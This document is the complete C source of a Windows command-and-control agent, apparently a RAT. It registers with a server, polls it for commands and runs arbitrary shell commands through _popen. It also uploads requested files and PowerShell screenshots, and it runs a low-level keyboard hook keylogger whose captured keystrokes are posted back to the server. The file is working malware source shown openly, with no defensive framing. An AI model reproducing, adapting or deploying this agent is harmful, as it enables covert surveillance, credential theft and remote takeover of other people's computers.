// agent_windows.c - Windows C2 agent
// Compile with: gcc agent_windows.c -o agent_windows.exe -lcurl -lws2_32 -luser32
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <curl/curl.h>
#include <direct.h>

#define SERVER_URL "http://localhost:8080"
#define AGENT_ID   "winagent1"

char current_dir[MAX_PATH] = {0};
volatile int keylogger_running = 0;
char keylog_buffer[4096] = {0};
size_t keylog_len = 0;

struct MemoryStruct {
    char *memory;
    size_t size;
};

size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    mem->memory = realloc(mem->memory, mem->size + realsize + 1);
    if(mem->memory == NULL) return 0;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

void register_agent() {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    char data[256];
    snprintf(data, sizeof(data),
        "{\"agentId\":\"%s\",\"agentIp\":\"127.0.0.1\",\"agentOs\":\"Windows\",\"agentStatus\":\"ACTIVE\"}",
        AGENT_ID);
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_URL, SERVER_URL "/agents");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

void upload_file(const char* filepath) {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    struct curl_httppost *form = NULL;
    struct curl_httppost *last = NULL;
    curl_formadd(&form, &last,
        CURLFORM_COPYNAME, "file",
        CURLFORM_FILE, filepath,
        CURLFORM_END);
    curl_formadd(&form, &last,
        CURLFORM_COPYNAME, "agentId",
        CURLFORM_COPYCONTENTS, AGENT_ID,
        CURLFORM_END);
    curl_easy_setopt(curl, CURLOPT_URL, SERVER_URL "/files/upload");
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, form);
    curl_easy_perform(curl);
    curl_formfree(form);
    curl_easy_cleanup(curl);
}

void take_screenshot(char* outpath, size_t outsize) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    char filename[MAX_PATH];
    snprintf(filename, sizeof(filename), "screenshot_%04d%02d%02d_%02d%02d%02d.png",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    snprintf(outpath, outsize, "%s", filename);
    char ps_cmd[512];
    snprintf(ps_cmd, sizeof(ps_cmd),
        "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; "
        "$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); "
        "$g = [Drawing.Graphics]::FromImage($bmp); "
        "$g.CopyFromScreen(0,0,0,0,$bmp.Size); "
        "$bmp.Save('%s');\"", filename);
    system(ps_cmd);
}

void list_directory(const char* path, char* out, size_t outsize) {
    WIN32_FIND_DATA findFileData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\*", path);
    HANDLE hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        snprintf(out, outsize, "Failed to open directory: %s", path);
        return;
    }
    size_t len = 0;
    do {
        len += snprintf(out + len, outsize - len, "%s\n", findFileData.cFileName);
    } while (FindNextFile(hFind, &findFileData) != 0 && len < outsize - 128);
    FindClose(hFind);
}

void list_processes(char* out, size_t outsize) {
    FILE *fp = _popen("tasklist", "r");
    if (fp) {
        fread(out, 1, outsize-1, fp);
        _pclose(fp);
    } else {
        snprintf(out, outsize, "Failed to list processes");
    }
}

HHOOK hKeyHook;
LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        char c = MapVirtualKeyA(p->vkCode, MAPVK_VK_TO_CHAR);
        if (c && keylog_len < sizeof(keylog_buffer)-2) {
            keylog_buffer[keylog_len++] = c;
            keylog_buffer[keylog_len] = 0;
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}
DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, hInstance, 0);
    MSG msg;
    while (keylogger_running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hKeyHook);
    return 0;
}
void start_keylogger() {
    keylogger_running = 1;
    CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
}
void stop_keylogger() {
    keylogger_running = 0;
}
void upload_keylog() {
    if (keylog_len == 0) return;
    CURL *curl = curl_easy_init();
    if (!curl) return;
    char post[8192];
    snprintf(post, sizeof(post), "{\"agentId\":\"%s\",\"logText\":\"%s\"}", AGENT_ID, keylog_buffer);
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    char url[256];
    snprintf(url, sizeof(url), "%s/keylogger/log", SERVER_URL);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    keylog_len = 0;
    keylog_buffer[0] = 0;
}

void fetch_and_execute() {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    char url[256];
    snprintf(url, sizeof(url), "%s/commands/agents/%s/pending", SERVER_URL, AGENT_ID);
    struct MemoryStruct chunk = { malloc(1), 0 };
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_perform(curl);
    char *cmd = strstr(chunk.memory, "\"command\":");
    char *cid = strstr(chunk.memory, "\"commandId\":");
    if (cmd && cid) {
        char command[256] = {0}, commandId[64] = {0};
        sscanf(cmd, "\"command\":\"%255[^"]", command);
        sscanf(cid, "\"commandId\":\"%63[^"]", commandId);
        if (strlen(command) > 0 && strlen(commandId) > 0) {
            printf("[*] Executing: %s\n", command);
            char result[4096] = {0};
            if (strncmp(command, "fetch_file ", 11) == 0) {
                const char* filepath = command + 11;
                upload_file(filepath);
                snprintf(result, sizeof(result), "File upload attempted: %s", filepath);
            } else if (strcmp(command, "screenshot") == 0) {
                char screenshot_path[MAX_PATH];
                take_screenshot(screenshot_path, sizeof(screenshot_path));
                struct _stat st;
                if (_stat(screenshot_path, &st) == 0) {
                    upload_file(screenshot_path);
                    snprintf(result, sizeof(result), "Screenshot taken: %s", screenshot_path);
                    remove(screenshot_path);
                } else {
                    snprintf(result, sizeof(result), "Screenshot failed");
                }
            } else if (strcmp(command, "start_keylogger") == 0) {
                start_keylogger();
                snprintf(result, sizeof(result), "Keylogger started");
            } else if (strcmp(command, "stop_keylogger") == 0) {
                stop_keylogger();
                snprintf(result, sizeof(result), "Keylogger stopped");
            } else if (strncmp(command, "cd ", 3) == 0) {
                const char* path = command + 3;
                if (_chdir(path) == 0) {
                    _getcwd(current_dir, sizeof(current_dir));
                    snprintf(result, sizeof(result), "Changed directory to %s", current_dir);
                } else {
                    snprintf(result, sizeof(result), "Failed to change directory");
                }
            } else if (strncmp(command, "list_dir ", 9) == 0) {
                const char* path = command + 9;
                list_directory(path, result, sizeof(result));
            } else if (strcmp(command, "list_processes") == 0) {
                list_processes(result, sizeof(result));
            } else {
                char prev_dir[MAX_PATH] = {0};
                _getcwd(prev_dir, sizeof(prev_dir));
                if (strlen(current_dir) > 0) _chdir(current_dir);
                FILE *fp = _popen(command, "r");
                if (fp) {
                    fread(result, 1, sizeof(result)-1, fp);
                    _pclose(fp);
                } else {
                    strcpy(result, "[error running command]");
                }
                _chdir(prev_dir);
            }
            CURL *rcurl = curl_easy_init();
            if (rcurl) {
                char post[8192];
                snprintf(post, sizeof(post), "agentId=%s&commandId=%s&resultText=%s", AGENT_ID, commandId, result);
                curl_easy_setopt(rcurl, CURLOPT_URL, SERVER_URL "/results/save");
                curl_easy_setopt(rcurl, CURLOPT_POSTFIELDS, post);
                curl_easy_perform(rcurl);
                curl_easy_cleanup(rcurl);
            }
            CURL *scurl = curl_easy_init();
            if (scurl) {
                char surl[256];
                snprintf(surl, sizeof(surl), "%s/commands/assign/%s/EXECUTED", SERVER_URL, commandId);
                curl_easy_setopt(scurl, CURLOPT_URL, surl);
                curl_easy_setopt(scurl, CURLOPT_CUSTOMREQUEST, "PUT");
                curl_easy_perform(scurl);
                curl_easy_cleanup(scurl);
            }
        }
    }
    free(chunk.memory);
    curl_easy_cleanup(curl);
}

int main() {
    curl_global_init(CURL_GLOBAL_ALL);
    register_agent();
    _getcwd(current_dir, sizeof(current_dir));
    int keylog_tick = 0;
    while (1) {
        fetch_and_execute();
        if (keylogger_running) {
            keylog_tick++;
            if (keylog_tick >= 10) {
                upload_keylog();
                keylog_tick = 0;
            }
        }
        Sleep(1000);
    }
    curl_global_cleanup();
    return 0;
} 